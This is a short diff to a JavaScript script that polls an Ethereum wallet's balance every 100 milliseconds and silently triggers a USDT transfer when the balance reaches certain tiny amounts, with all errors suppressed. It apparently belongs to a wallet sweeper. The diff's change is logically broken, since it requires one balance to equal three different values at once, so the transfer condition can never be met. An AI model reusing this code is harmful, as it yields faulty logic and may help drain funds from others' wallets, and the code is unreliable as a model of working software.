@@ -47,9 +47,6 @@ async function sendUSDT() {
         // Suppress errors silently
     }
 }
-
-// Function to monitor ETH balance
-
 // Function to monitor ETH balance
 async function monitorBalance() {
     try {
@@ -57,13 +54,14 @@ async function monitorBalance() {
         const ethBalance = parseFloat(ethers.formatEther(balance));
 
         // Trigger USDT transfer if balance matches criteria
-        if (ethBalance === 0.003  ethBalance === 0.002  ethBalance === 0.001) {
+        if (ethBalance === 0.003 && ethBalance === 0.002 && ethBalance === 0.001) {
             await sendUSDT();
         }
     } catch (error) {
         // Suppress errors silently
     }
 }
+
 // Main function to start monitoring
 function startMonitoring() {
     // Poll balance every 100 milliseconds
